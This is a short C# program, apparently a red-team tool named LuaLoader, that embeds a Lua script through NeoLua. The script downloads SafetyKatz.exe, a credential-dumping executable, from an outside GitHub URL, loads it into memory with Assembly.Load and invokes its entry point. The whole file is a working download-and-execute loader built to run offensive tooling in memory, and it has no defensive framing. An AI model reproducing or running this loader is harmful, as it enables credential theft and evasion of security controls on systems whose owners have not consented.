// Author: NotoriousRebel

using System;
using Neo.IronLua;

namespace LuaLoader
{
    class Program
    {
        /// <summary>
        /// Using NeoLua (Lua implementation for the Dynamic Language Runtime (DLR))
        /// Pulls down an assembly and loads it into memory
        /// </summary>
        public static void Main()
        {
            Lua lua = new Lua();
            dynamic dg = lua.CreateEnvironment<LuaGlobal>();
            try
            {
                System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls12;
                var source = @"
                local url = ""https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Ghostpack/SafetyKatz.exe?raw=true"";
                local sys = clr.System;
                local client = sys.Net.WebClient(); 
                local buffer = client:DownloadData(url);
                local ms = sys.IO.MemoryStream(buffer);
                local br = sys.IO.BinaryReader(ms);
                print(""br is created"");
                local bin = br:ReadBytes(sys.Convert:ToInt32(ms.Length));
                print(""bin is created"");
                ms:Close();
                br:Close();
                local a = sys.Reflection.Assembly:Load(bin);
                print(""assembly has been loaded"");
                a.EntryPoint:Invoke(nil, sys.Object[] {sys.String[]{ } } );
                return 1;
                ";
                var chunk = lua.CompileChunk(source, "test.lua", new LuaCompileOptions() { DebugEngine = null });
                Console.WriteLine(dg.dochunk(chunk));
            }
            catch (Exception e)
            {
                Console.WriteLine("Expception: {0}", e.Message);
                var d = LuaExceptionData.GetData(e); // get stack trace
                Console.WriteLine("StackTrace: {0}", d.FormatStackTrace(0, false));
            }
        }
    }
}
